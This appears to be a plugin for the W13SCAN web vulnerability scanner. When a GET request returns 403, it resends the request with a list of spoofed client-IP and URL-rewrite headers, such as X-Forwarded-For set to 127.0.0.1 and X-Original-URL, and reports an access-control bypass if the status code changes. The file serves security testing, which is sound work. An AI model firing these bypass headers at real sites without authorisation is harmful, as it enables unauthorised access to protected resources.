
import os
import requests

from lib.core.common import generateResponse
from lib.core.enums import VulType, PLACE
from lib.core.plugins import PluginBase
from urllib.parse import urlparse


class W13SCAN(PluginBase):
    name = 'bypass 403的请求'
    desc = '''bypass 403的请求'''

    def _check(self):
        if self.response.status_code != 403:
            return False
        result = urlparse(self.requests.url)
        path = result.path
        payload_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded": "127.0.0.1",
            "Forwarded-For": "127.0.0.1",
            "Forwarded": "127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1",
            "X-remote-IP": "127.0.0.1",
            "X-remote-addr": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "Client-IP": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Original-URL": path,
            "X-Rewrite-URL": path,
            "Referer": self.requests.url,
            "Ali-CDN-Real-IP": "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "Cdn-Src-Ip": "127.0.0.1",
            "Cdn-Real-Ip": "127.0.0.1",
            "CF-Connecting-IP": "127.0.0.1",
            "X-Cluster-Client-IP": "127.0.0.1",
            "WL-Proxy-Client-IP": "127.0.0.1",
            "Proxy-Client-IP": "127.0.0.1",
            "Fastly-Client-Ip": "127.0.0.1"
        }
        for key in payload_headers:
            for key1 in self.requests.headers:
                if key.lower() == key1.lower():
                    self.requests.headers[key1] = payload_headers[key]
                else:
                    self.requests.headers[key] = payload_headers[key]
                try:
                    if self.requests.method == "GET":
                        response = requests.get(self.url, headers=payload_headers, timeout=5)
                        if response.status_code != 403:
                            return True
                except Exception as e:
                    pass
        return False

    def audit(self):
        # 目前只检测get请求
        if self.requests.method == "GET":
            if self._check():
                result = self.new_result()
                result.init_info(self.requests.url, "未授权访问", VulType.BRUTE_FORCE)
                result.add_detail("payload请求", "", "",
                              self.requests.url + "存在403 byapass", "", "", PLACE.GET)
                self.success(result)

